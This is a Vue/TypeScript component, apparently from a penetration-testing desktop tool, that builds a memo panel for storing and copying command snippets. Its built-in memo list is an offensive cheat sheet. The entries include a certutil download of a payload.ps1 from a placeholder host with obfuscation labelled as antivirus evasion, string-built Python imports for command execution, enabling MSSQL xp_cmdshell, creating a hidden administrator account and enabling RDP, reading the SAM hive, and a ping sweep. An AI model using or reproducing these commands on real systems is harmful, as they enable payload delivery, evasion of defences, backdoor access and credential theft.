<template>
    <div class="flex-box">
        <div style="width: 50vh">
            <el-button-group style="margin-bottom: 10px; width: 100%;">
                <el-button type="primary" style="width: 50%;" @click="dialog = true">添加</el-button>
                <el-button type="primary" style="width: 50%;" @click="
                    save()
                ElNotification.success({
                    message: 'Save successfully',
                    position: 'bottom-right',
                });
                ">保存</el-button>
            </el-button-group>
            <el-table :data="data.memo" border highlight-current-row :show-header="false" @current-change="handleChange"
                style="height: 85vh;">
                <el-table-column prop="label" />
                <el-table-column align="center" width="80">
                    <template #default="scope">
                        <el-button link type="primary" size="small" @click.prevent="deleteRow(scope.$index)">
                            移除
                        </el-button>
                    </template>
                </el-table-column>
            </el-table>
        </div>
        <div style="width: 70%; margin-left: 10px;">
            <pre class="pretty-response" style="margin: 0; height: auto;"><code>{{ reverse.show }}</code></pre>
            <el-button type="primary" style="float: right; margin-top: 10px;"
                @click="Copy(reverse.show)">复制</el-button>
        </div>
    </div>
    <el-dialog title="添加" v-model="dialog" width="500">
        <el-form>
            <el-form-item label="标题:">
                <el-input v-model="reverse.name"></el-input>
            </el-form-item>
            <el-form-item label="内容:">
                <el-input v-model="reverse.content" type="textarea" rows="5"></el-input>
            </el-form-item>
        </el-form>
        <template #footer>
            <div class="dialog-footer">
                <el-button @click="dialog = false">取消</el-button>
                <el-button type="primary" @click="onAddItem">
                    添加
                </el-button>
            </div>
        </template>
    </el-dialog>
</template>

<script lang="ts" setup>
import { reactive, ref, onMounted } from 'vue';
import { ElMessage, ElNotification } from 'element-plus'
import { CheckFileStat, InitMemo, ReadMemo } from 'wailsjs/go/main/File';
import { Copy } from '@/util';
import global from '@/global';
onMounted(async () => {
    handleChange(data.memo[0])
    let fp = global.PATH.homedir + "/slack/memo.txt"
    if (await CheckFileStat(fp)) {
        let kv = await ReadMemo(fp)
        data.memo = Object.entries(kv).map(([label, value]) => ({
            label: label,
            value: value
        }));
    } else {
        save()
    }
});

const dialog = ref(false)

const reverse = reactive({
    name: '',
    content: '',
    ip: '10.10.10.1',
    port: '60001',
    show: '',
    currentID: 0
})

var data = reactive({
    memo: [
        {
            label: "Windows下载文件",
            value: `certutil -urlcache -split -f http://xxx.cn/test.txt

(绕过杀软) start cert^u^t^il -url""""cache -sp""""lit -f http://x.x.x.x:8080/payload.ps1`
        },
        {
            label: "Python动态导入RCE",
            value: `import importlib

# 拼接字符串为模块名
module_name = "o" + "s"

# 动态导入模块
ss = importlib.import_module(module_name)
# 执行os模块的操作
ss.system("whoami")`
        },
        {
            label: "Mssql执行命令",
            value: `EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;exec master..xp_cmdshell 'whoami';`
        },
        {
            label: "显示系统中曾经连过WIFI密码",
            value: `netsh wlan show profiles`
        },
        {
            label: "检查系统是否为Vmware",
            value: `wmic bios list full | find /i "vmware"`
        },
        {
            label: "Windows查看计划任务",
            value: `schtasks /QUERY /fo LIST /v`
        },
        {
            label: "Windows添加用户&开启RDP",
            value: `添加用户并添加到管理员组
net user Guest01$ Aa123456. /add
net localgroup Administrators Guest01$ /add

开启3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
        },
        {
            label: "Windows注册表查用户",
            value: `reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`
        },
        {
            label: "Windows查文件",
            value: `dir c:\ /s /b | find "win.ini"`
        },
        {
            label: "Linux Ping探活",
            value: `for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived; fi; done`
        },
    ]
})

function handleChange(row: any) {
    reverse.show = row.value;
}

function deleteRow(index: number) {
    data.memo.splice(index, 1)
}

function onAddItem() {
    if (!reverse.name) {
        ElMessage({
            showClose: true,
            message: "标题名称不能为空！",
        });
        return
    }
    for (const item of data.memo) {
        if (reverse.name == item.label) {
            ElMessage({
                showClose: true,
                message: "标题名称不能重复！",
                type: 'warning'
            });
            return
        }
    }
    data.memo.push({
        label: reverse.name,
        value: reverse.content
    })
    reverse.content = ''
    dialog.value = false
}

async function save() {
    let temp = ''
    data.memo.forEach((item, index) => {
        if (index != data.memo.length - 1) {
            temp += `[${item.label}]\n${item.value.trim()}\n`
        } else {
            temp += `[${item.label}]\n${item.value.trim()}`
        }
    });
    InitMemo(global.PATH.homedir + "/slack/memo.txt", temp)
}
</script>